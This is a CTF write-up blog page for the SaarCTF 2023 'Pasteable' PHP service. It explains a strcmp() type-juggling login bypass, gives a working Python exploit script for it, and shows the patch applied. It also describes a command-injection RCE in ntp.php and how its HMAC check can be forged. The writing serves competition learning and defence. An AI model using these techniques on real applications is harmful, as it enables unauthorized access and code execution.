<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SaarCTF2023 - Pasteable | leo_something</title>
<meta name="keywords" content="attack-defense, web, PHP, type confusion">
<meta name="description" content="This challenge was part of the attack/defense SaarCTF of 2023. This is a web challenge written in PHP, where a wrong use of &ldquo;==&rdquo; led to a type juggling vulnerability.">
<meta name="author" content="team bhackari">
<link rel="canonical" href="http://leo1.cc/posts/writeups/saarctf23-pasteable/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.62bb6a5e71ed8590b51185096e2d3dea8379889277e03fcf9ef8a01b0f6d9dc0.css" integrity="sha256-YrtqXnHthZC1EYUJbi096oN5iJJ34D/PnvigGw9tncA=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://leo1.cc/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://leo1.cc/apple-touch-icon.png">
<link rel="mask-icon" href="http://leo1.cc/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://leo1.cc/posts/writeups/saarctf23-pasteable/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="http://leo1.cc/posts/writeups/saarctf23-pasteable/">
  <meta property="og:site_name" content="leo_something">
  <meta property="og:title" content="SaarCTF2023 - Pasteable">
  <meta property="og:description" content="This challenge was part of the attack/defense SaarCTF of 2023. This is a web challenge written in PHP, where a wrong use of “==” led to a type juggling vulnerability.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-11-19T12:00:00+00:00">
    <meta property="article:modified_time" content="2023-11-19T12:00:00+00:00">
    <meta property="article:tag" content="Attack-Defense">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="PHP">
    <meta property="article:tag" content="Type Confusion">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SaarCTF2023 - Pasteable">
<meta name="twitter:description" content="This challenge was part of the attack/defense SaarCTF of 2023. This is a web challenge written in PHP, where a wrong use of &ldquo;==&rdquo; led to a type juggling vulnerability.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://leo1.cc/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "SaarCTF2023 - Pasteable",
      "item": "http://leo1.cc/posts/writeups/saarctf23-pasteable/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SaarCTF2023 - Pasteable",
  "name": "SaarCTF2023 - Pasteable",
  "description": "This challenge was part of the attack/defense SaarCTF of 2023. This is a web challenge written in PHP, where a wrong use of \u0026ldquo;==\u0026rdquo; led to a type juggling vulnerability.",
  "keywords": [
    "attack-defense", "web", "PHP", "type confusion"
  ],
  "articleBody": "Service description Pasteable is a website, written in PHP, which allows a user to register, login and then create some “pastes” inside a Mysql database. This pastes get encrypted by the backend with a key provided by the user. The last feature of this website allows users to view the stored pastes and decrypt them with the appropriate keys.\nWhat’s our goal? The attack.json file provided by the SaarCTF organizers contained a list of usernames for this challenge, so we are probably supposed to login as that user and read the flag from the pastes list. Once this was clear we started to check how the login was handled: a user is logged in when authenticated is set to yes inside the $_SESSION array. So our goal is to set $_SESSION[\"authenticated\"] to yes.\n// forward the good bois if(isset($_SESSION[\"authenticated\"]) \u0026\u0026 $_SESSION[\"authenticated\"] === \"yes\") { header('Location: /admin/home'); exit(); } How can we log in? Analysing the source code we can see that there are 2 places where the backend does what we want: in /func/register.php and in /func/login.php. We can see that the first file can’t do anything for us, because it only allows to set “authenticated” to “yes” for a newly created user. The second one, tho, allows us to login with any username, so let’s take a look on how this works.\n\u003c?php session_start(); require(\"config.php\"); // include challenge functions include('./lib/challenge.php'); if(!isset($_POST['username']) || !isset($_POST['solution'])){ header('HTTP/1.0 403 Forbidden'); die(\"Invalid request\"); } if(!isset($_SESSION['challenge']) || !(strcmp($_POST['solution'], $_SESSION['challenge']) == 0)){ header('HTTP/1.0 403 Forbidden'); die(\"No valid challenge found\"); } destroyChallenge(); $username = $_POST['username']; $stmt = $MYSQLI-\u003eprepare(\"SELECT user_id FROM user_accounts WHERE user_name = ? LIMIT 1\"); if ( $stmt \u0026\u0026 $stmt -\u003e bind_param('s', $username) \u0026\u0026 $stmt -\u003e execute() \u0026\u0026 $stmt -\u003e store_result() \u0026\u0026 $stmt -\u003e bind_result($userid) \u0026\u0026 $stmt -\u003e fetch() ) { // user exists $_SESSION['last_login'] = date(\"Y-m-d H:i:s\", time()); $_SESSION['id'] = $userid; $_SESSION['name'] = $username; // set new state $_SESSION['authenticated'] = \"yes\"; } else { // wrong data! $_SESSION['last_login'] = date(\"Y-m-d H:i:s\", time()); header('HTTP/1.0 403 Forbidden'); } We can see that authenticated is set to yes only if the SQL query made previously is successful. What does that query do? It selects the user_id of the user with the username that we send to the page when we make the request. Our goal is for that query to be executed with our username, the problem is that are 2 if statements that prevent us from doing so:\nthe first checks if we sent both \"username\" and \"solution\" fields in our http request, and if not it gives us a 403 invalid request error. then the second checks if \"challenge\" is set inside the $_SESSION array and checks if the solution we sent is equal to what is inside $_SESSION at the index \"challenge\", if one of those conditions is false it gives us a 403 No valid challenge founderror. But what are those \"challenge\" and \"solution\"? We can see that the page includes the following file: /lib/challenge.php. This file has 2 functions:\n\u003c?php /** * Generates a new challenge * * @return string */ function generateChallenge() { mt_srand(time()); $strength = 6; $alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; $l = strlen($alpha); $random_string = ''; for($i = 0; $i \u003c $strength; $i++) { $random_character = $alpha[mt_rand(0, $l - 1)]; $random_string .= $random_character; } $_SESSION['challenge'] = $random_string; return $random_string; } /** * Destroys challenge */ function destroyChallenge() { unset($_SESSION['challenge']); } The first one creates a \"challenge\", which is set inside the $_SESSION array as a string of 6 random chars taken from the following alphabet “ABCDEFGHIJKLMNOPQRSTUVWXYZ”, and the second one destroys it. We can see that the first function is getting called inside /func/challenge.php file and the second one inside /func/login.php file. So basically we have to send a POST request to /func/challenge.php (with the username as a parameter) in order to set inside the $_SESSION array the \"challenge\". After that, we have to send another POST request to login.php with two parameters: “username” and “solution”, where “solution”must be equal to the challenge that was generated before. The brute-force approach is not the best solution because having an alphabet of 26 chars, and a string of 6 chars, we would have to try 308.915.776 times to be sure to find the correct \"challenge\", this is obviously impractical, so we must find another approach.\nstrcmp() vuln and type juggling In the login.php page we analysed almost everything, the only thing remaining is the strcmp() function, just by googling and opening the PHP documentation, we can read this:\nIf you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable. For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.\nSo basically we can make this function return NULL thanks to PHP comparison problems with “==”. NULL is equal to 0: this vuln is called type juggling.\nBut how can we make it return NULL? Reading the documentation we find out that if a parameter is an array strcmp returns NULL.\nstrcmp(\"foo\", array()) =\u003e NULL + PHP Warning strcmp(\"foo\", new stdClass) =\u003e NULL + PHP Warning strcmp(function(){}, \"\") =\u003e NULL + PHP Warning\nIn conclusion our attack is composed like this:\nPOST request to /func/challenge.php with one parameter: \"username\", this sets the \"challenge\" inside the $_SESSION array. POST request to /func/login.php with two parameters: \"username\" and the \"solution\" (array), setting \"authenticated\" inside the $_SESSION array. GET request to /admin/home/index.php in order to print the paste with the flag. Exploit: Our exploit takes a command line argument: the IP of an enemy team, and takes from the attack.json file the username that it will use to log in.\n#!/usr/bin/env python3 import random import string import sys import requests import json from pwn import * from Crypto.Hash import SHA256 import sys def get_flag_ids(team_id, service_name): url = \"https://scoreboard.ctf.saarland/attack.json\" try: response = requests.get(url) response.raise_for_status() data = response.json() if \"flag_ids\" in data and service_name in data[\"flag_ids\"]: if team_id in [team[\"id\"] for team in data[\"teams\"]]: for team in data[\"teams\"]: if team[\"id\"] == team_id: team_ip = next(team[\"ip\"]) return data[\"flag_ids\"][service_name].get(team_ip, {}) else: print(\"Invalid team_id or service_name\") except requests.exceptions.RequestException as e: print(f\"Error: {e}\") def get_data(team_id, service_name, flag_id): url = \"https://scoreboard.ctf.saarland/attack.json\" try: response = requests.get(url) response.raise_for_status() data = response.json() for team in data[\"teams\"]: if team[\"id\"] == team_id: team_ip = next(team[\"ip\"]) return data[\"flag_ids\"][service_name][team_ip][flag_id] except requests.exceptions.RequestException as e: print(f\"Error: {e}\") host = sys.argv[1] team = (int(host.split(\".\")[1])-32)*200 + int(host.split(\".\")[2]) print(\"I need to attack the team {} with host: {}\".format(team,host)) service = 'Pasteable' for id in get_flag_ids(team,service): username = get_data(team, service, id) s = requests.Session() res = s.post(f\"http://{host}:8080/func/challenge.php\", data={\"username\":username}) res = s.post(f\"http://{host}:8080/func/login.php\", data={\"username\":username, \"solution[]\":b\"\"}) res = s.get(f\"http://{host}:8080/admin/\") print(res.text, flush=True) Patch To patch this vuln we have 2 options:\nCheck the type of the “solution” parameter and allow only string values. Check the \"solution\" parameter in another way, instead of using the strcmp() function. We decided to patch the service using the first option, and used the gettype() function to verify if \"solution\" was indeed a string.\nif( !isset($_POST['username']) || !isset($_POST['solution']) || gettype($_POST[\"solution\"])!=\"string\" ){ header('HTTP/1.0 403 Forbidden'); die(\"Invalid request\"); } P.S: We also found a potential RCE in the /func/ntp.php file, but we didn’t concentrate much on that because we had already a very efficient exploit running. Also the team was very short of players so we focused more on exploiting the other services.\nJust for completeness, this is the potentially vulnerable code:\n// Network-Time-Protocol API // variables and configs require(\"../func/config.php\"); // ensure that requester knows super-duper-secret $additional_time_formatter = (isset($_GET['modifiers'])) ? $_GET['modifiers'] : \"\"; $caller_nonce = (isset($_GET['nonce'])) ? $_GET['nonce'] : \"\"; $caller_checksum = (isset($_GET['checksum'])) ? $_GET['checksum'] : \"\"; if(isset($_GET['modifiers'])) { $nonce_hash = hash_hmac('sha256', $caller_nonce, $APP_SECRET); $checksum = hash_hmac('sha256', $additional_time_formatter, $nonce_hash); // if the checksum is wrong, the requester is a bad guy who // doesn't know the secret if($checksum !== $caller_checksum) { die(\"ERROR: Checksum comparison has failed!\"); } } // print current time $time_command = ($APP_HOST === 'win') ? \"date /t \u0026\u0026 time /t\" : \"date\"; $requested_time = `$time_command $additional_time_formatter`; echo preg_replace('~[\\r\\n]+~', '', $requested_time); This ntp.php file uses OS commands to get the timestamp. The vulnerability is that a user-controlled parameter is appended to the command, this is exploitable and enables RCE on the backend. The only complication is the hmac checksum verification, but this can be bypassed because:\nThe $APP_SECRET is hardcoded and reused. We have control over the \"nonce\" and the \"checksum\" parameters. So, if we forge \"checksum\" and \"nonce\" based on our\"modifiers\" (which contains our code injection payload), we should achieve the RCE we’ve longed for. ",
  "wordCount" : "1407",
  "inLanguage": "en",
  "datePublished": "2023-11-19T12:00:00Z",
  "dateModified": "2023-11-19T12:00:00Z",
  "author":{
    "@type": "Person",
    "name": "team bhackari"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://leo1.cc/posts/writeups/saarctf23-pasteable/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "leo_something",
    "logo": {
      "@type": "ImageObject",
      "url": "http://leo1.cc/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://leo1.cc/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://leo1.cc/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="http://leo1.cc/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://leo1.cc/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      SaarCTF2023 - Pasteable
    </h1>
    <div class="post-meta"><span title='2023-11-19 12:00:00 +0000 UTC'>November 19, 2023</span>&nbsp;·&nbsp;team bhackari

</div>
  </header>
  <div class="tags" style="padding: 2px;">
    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
      
      <a href="/tags/attack-defense" class="custom-tag">
        attack-defense
      </a>
      
      <a href="/tags/web" class="custom-tag">
        web
      </a>
      
      <a href="/tags/php" class="custom-tag">
        PHP
      </a>
      
      <a href="/tags/type-confusion" class="custom-tag">
        type confusion
      </a>
      
    </div>
  </div>

  <div style="height: var(--gap);"></div> 
  <div class="post-content"><h2 id="service-description">Service description<a hidden class="anchor" aria-hidden="true" href="#service-description">#</a></h2>
<p><strong>Pasteable</strong> is a website, written in PHP, which allows a user to register, login and then create some &ldquo;pastes&rdquo; inside a Mysql database. This pastes get encrypted by the backend with a key provided by the user. The last feature of this website allows users to view the stored pastes and decrypt them with the appropriate keys.</p>
<hr>
<h2 id="whats-our-goal">What&rsquo;s our goal?<a hidden class="anchor" aria-hidden="true" href="#whats-our-goal">#</a></h2>
<p>The <code>attack.json</code> file provided by the SaarCTF organizers contained a list of usernames for this challenge, so we are probably supposed to login as that user and read the flag from the pastes list.
Once this was clear we started to check how the login was handled: a user is logged in when <code>authenticated</code> is set to <code>yes</code> inside the <code>$_SESSION</code> array.
So our goal is to set <code>$_SESSION[&quot;authenticated&quot;]</code> to <code>yes</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// forward the good bois
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#34;authenticated&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_SESSION[<span style="color:#e6db74">&#34;authenticated&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;yes&#34;</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: /admin/home&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<h2 id="how-can-we-log-in">How can we log in?<a hidden class="anchor" aria-hidden="true" href="#how-can-we-log-in">#</a></h2>
<p>Analysing the source code we can see that there are 2 places where the backend does what we want: in <code>/func/register.php</code> and in <code>/func/login.php</code>.
We can see that the first file can’t do anything for us, because it only allows to set “authenticated” to “yes” for a newly created user.
The second one, tho, allows us to login with any username, so let’s take a look on how this works.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;config.php&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// include challenge functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;./lib/challenge.php&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;solution&#39;</span>])){
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Invalid request&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;challenge&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">strcmp</span>($_POST[<span style="color:#e6db74">&#39;solution&#39;</span>], $_SESSION[<span style="color:#e6db74">&#39;challenge&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)){
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;No valid challenge found&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">destroyChallenge</span>();
</span></span><span style="display:flex;"><span>$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>$stmt <span style="color:#f92672">=</span> $MYSQLI<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT user_id FROM user_accounts WHERE user_name = ? LIMIT 1&#34;</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (
</span></span><span style="display:flex;"><span>	$stmt <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	$stmt <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#39;s&#39;</span>, $username) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	$stmt <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">execute</span>() <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	$stmt <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">store_result</span>() <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	$stmt <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">bind_result</span>($userid) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	$stmt <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fetch</span>()
</span></span><span style="display:flex;"><span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// user exists
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$_SESSION[<span style="color:#e6db74">&#39;last_login&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;Y-m-d H:i:s&#34;</span>, <span style="color:#a6e22e">time</span>());
</span></span><span style="display:flex;"><span>	$_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">=</span> $userid;
</span></span><span style="display:flex;"><span>	$_SESSION[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">=</span> $username;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set new state
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$_SESSION[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;yes&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// wrong data!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$_SESSION[<span style="color:#e6db74">&#39;last_login&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;Y-m-d H:i:s&#34;</span>, <span style="color:#a6e22e">time</span>());
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that <code>authenticated</code> is set to <code>yes</code> only if the SQL query made previously is successful.
<strong>What does that query do?</strong> It selects the <code>user_id</code> of the user with the username that we send to the page when we make the request.
Our goal is for that query to be executed with our username, the problem is that are 2 if statements that prevent us from doing so:</p>
<ul>
<li>the first checks if we sent both <code>&quot;username&quot;</code> and <code>&quot;solution&quot;</code> fields in our http request, and if not it gives us a <code>403 invalid request</code> error.</li>
<li>then the second checks if <code>&quot;challenge&quot;</code> is set inside the <code>$_SESSION</code> array and checks if the solution we sent is equal to what is inside <code>$_SESSION</code> at the index <code>&quot;challenge&quot;</code>, if one of those conditions is false it gives us a <code>403 No valid challenge found</code>error.</li>
</ul>
<p><strong>But what are those <code>&quot;challenge&quot;</code> and <code>&quot;solution&quot;</code>?</strong>
We can see that the page includes the following file: <code>/lib/challenge.php</code>. This file has 2 functions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Generates a new challenge
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* @return string
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateChallenge</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mt_srand</span>(<span style="color:#a6e22e">time</span>());
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	$strength <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>	$alpha <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>;
</span></span><span style="display:flex;"><span>	$l <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($alpha);
</span></span><span style="display:flex;"><span>	$random_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $strength; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$random_character <span style="color:#f92672">=</span> $alpha[<span style="color:#a6e22e">mt_rand</span>(<span style="color:#ae81ff">0</span>, $l <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)];
</span></span><span style="display:flex;"><span>		$random_string <span style="color:#f92672">.=</span> $random_character;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	$_SESSION[<span style="color:#e6db74">&#39;challenge&#39;</span>] <span style="color:#f92672">=</span> $random_string;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> $random_string;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Destroys challenge
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroyChallenge</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">unset</span>($_SESSION[<span style="color:#e6db74">&#39;challenge&#39;</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The first one creates a <code>&quot;challenge&quot;</code>, which is set inside the <code>$_SESSION</code> array as a string of 6 random
chars taken from the following alphabet <code>“ABCDEFGHIJKLMNOPQRSTUVWXYZ”</code>, and the second one
destroys it.
We can see that the first function is getting called inside <code>/func/challenge.php</code> file and the
second one inside <code>/func/login.php</code> file.
So basically we have to send a POST request to <code>/func/challenge.php</code> (with the username as a
parameter) in order to set inside the <code>$_SESSION</code> array the <code>&quot;challenge&quot;</code>. After that, we have to send another POST request to <code>login.php</code> with two parameters: <code>“username”</code> and <code>“solution”</code>, where <code>“solution”</code>must be equal to the challenge that was generated before.
The brute-force approach is not the best solution because having an alphabet of 26 chars, and a string of 6 chars, we would have to try <code>308.915.776</code> times to be sure to find the correct <code>&quot;challenge&quot;</code>, this is obviously impractical, so we must find another approach.</p>
<hr>
<h2 id="strcmp-vuln-and-type-juggling">strcmp() vuln and type juggling<a hidden class="anchor" aria-hidden="true" href="#strcmp-vuln-and-type-juggling">#</a></h2>
<p>In the <code>login.php</code> page we analysed almost everything, the only thing remaining is the <code>strcmp() function</code>, just by googling and opening the PHP documentation, we can read this:</p>
<blockquote>
<p><code>If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.   For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.</code></p>
</blockquote>
<p>So basically we can make this function return NULL thanks to PHP comparison problems with <code>“==”</code>. NULL is equal to 0: this vuln is called <strong>type juggling</strong>.</p>
<p><strong>But how can we make it return NULL?</strong>
Reading the documentation we find out that if a parameter is an array <code>strcmp</code> returns NULL.</p>
<blockquote>
<p><code>strcmp(&quot;foo&quot;, array()) =&gt; NULL + PHP Warning   strcmp(&quot;foo&quot;, new stdClass) =&gt; NULL + PHP Warning   strcmp(function(){}, &quot;&quot;) =&gt; NULL + PHP Warning</code></p>
</blockquote>
<p>In conclusion our attack is composed like this:</p>
<ol>
<li>POST request to <code>/func/challenge.php</code> with one parameter: <code>&quot;username&quot;</code>, this sets the <code>&quot;challenge&quot;</code> inside the <code>$_SESSION</code> array.</li>
<li>POST request to <code>/func/login.php</code> with two parameters: <code>&quot;username&quot;</code> and the <code>&quot;solution&quot;</code> (array), setting <code>&quot;authenticated&quot;</code> inside the <code>$_SESSION</code> array.</li>
<li>GET request to <code>/admin/home/index.php</code> in order to print the paste with the flag.</li>
</ol>
<hr>
<h2 id="exploit">Exploit:<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
<p>Our exploit takes a command line argument: the IP of an enemy team, and takes from the <code>attack.json</code> file the username that it will use to log in.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
